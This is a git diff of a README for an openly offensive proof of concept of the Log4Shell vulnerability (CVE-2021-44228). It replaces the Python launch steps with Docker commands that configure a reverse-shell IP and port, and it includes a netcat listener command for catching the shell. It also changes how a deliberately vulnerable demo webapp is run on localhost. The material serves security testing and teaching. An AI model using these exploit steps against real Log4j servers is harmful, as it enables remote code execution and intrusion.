@@ -30,11 +30,6 @@ Proof-of-concept (POC)
 
 As a PoC we have created a python file that automates the process. 
 
-
-#### Requirements:
-```bash
-pip install -r requirements.txt
-```
 #### Usage:
 
 
@@ -43,9 +38,10 @@ pip install -r requirements.txt
 nc -lvnp 9001
 ```
 * Launch the exploit.<br>
-**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
+**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory of 'Dockerfile_poc'.
 ```py
-$ python3 poc.py --userip localhost --webport 8000 --lport 9001
+$ docker build -t log4j-poc -f Dockerfile_poc .
+$ docker run --rm -it -e WEB_IP="localhost" -e RSHELL_IP="localhost" -e RSHELL_PORT="9001" -p 127.0.0.1:8000:8000 -p 127.0.0.1:1389:1389 --name exploit log4j-poc
 
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/kozmer/log4j-shell-poc
@@ -69,7 +65,7 @@ Our vulnerable application
 We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
 ```c
 1: docker build -t log4j-shell-poc .
-2: docker run --network host log4j-shell-poc
+2: docker run --rm -it -p 127.0.0.1:8080:8080 log4j-shell-poc
 ```
 Once it is running, you can access it on localhost:8080
 
